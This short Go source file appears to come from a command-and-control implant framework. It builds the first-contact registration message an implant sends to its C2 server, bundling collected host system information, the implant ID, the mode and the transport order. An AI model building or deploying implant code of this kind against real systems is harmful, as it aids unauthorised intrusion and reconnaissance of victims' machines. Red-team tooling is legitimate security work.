package runtime

import (
	"encoding/json"
	"fmt"
)

// RegisterMessage is the initial registration handshake payload sent
// from the implant to the C2 server on first contact.
type RegisterMessage struct {
	ImplantID  string      `json:"implant_id"`
	Mode       string      `json:"mode"`
	SystemInfo *SystemInfo `json:"system_info"`
	Transports []string    `json:"transports"`
}

// BuildRegisterMessage collects system information and constructs the
// registration payload for the C2 server.
func BuildRegisterMessage(cfg *Config) ([]byte, error) {
	collector := NewCollector()
	sysInfo, err := collector.Collect()
	if err != nil {
		return nil, fmt.Errorf("collecting system info: %w", err)
	}

	msg := &RegisterMessage{
		ImplantID:  cfg.ImplantID,
		Mode:       cfg.Mode,
		SystemInfo: sysInfo,
		Transports: cfg.TransportOrder,
	}

	data, err := json.Marshal(msg)
	if err != nil {
		return nil, fmt.Errorf("marshaling register message: %w", err)
	}

	return data, nil
}
